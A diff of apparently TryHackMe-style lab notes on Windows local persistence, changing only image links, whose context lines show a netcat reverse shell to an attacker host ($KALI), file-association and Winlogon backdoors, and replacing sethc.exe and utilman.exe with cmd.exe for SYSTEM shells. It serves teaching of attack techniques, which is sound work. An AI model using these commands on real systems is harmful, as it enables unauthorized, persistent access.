@@ -238,7 +238,7 @@ Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe $KALI 4445"
 nc -lvp 4445
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Hijacking File Associations
 
@@ -250,7 +250,7 @@ The default operating system file associations are kept inside the registry, whe
 
 We can then search for a subkey for the corresponding ProgID (also under HKLM\Software\Classes), in this case, txtfile, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under shell\open\command where the default command to be run for files with that extension is specified.
 
-<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 In this case, when you try to open a .txt file, the system will execute %SystemRoot%\system32\NOTEPAD.EXE %1, where %1 represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1.
 
@@ -373,7 +373,7 @@ You should be able to find a stopped service called THMService3. To query the se
 sc.exe qc THMService3
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There are three things we care about when using a service for persistence:
 
@@ -596,9 +596,9 @@ Note: While in a real-world set-up you could use any name for your registry entr
 <pre><code><strong>C:\tools\pstools\PsExec64.exe -i -s regedit
 </strong></code></pre>
 
-![](<../../.gitbook/assets/image (3).png>)
+![](<../../.gitbook/assets/image (3) (2).png>)
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).
 
@@ -658,11 +658,11 @@ Note: While both `shell` and `Userinit` could be used to achieve persistence in 
 
 Add: C:\Windows\revshell.exe
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Logon scripts
 
@@ -779,19 +779,21 @@ icacls C:\Windows\System32\sethc.exe /grant Administrator:F
 copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
 ```
 
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
 After doing so, lock your session from the start menu.
 
-
+![](<../../.gitbook/assets/image (5).png>)
 
 You should now be able to press `SHIFT` five times to access a terminal with SYSTEM privileges directly from the login screen.
 
-
+<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
 ### Utilman
 
 Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen.
 
-
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -809,13 +811,15 @@ icacls C:\Windows\System32\utilman.exe /grant Administrator:F
 copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 ```
 
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
 To trigger our terminal, we will lock our screen from the start button.
 
-
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with SYSTEM privileges.
 
-
+<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 ## Persisting Through Existing Services
 
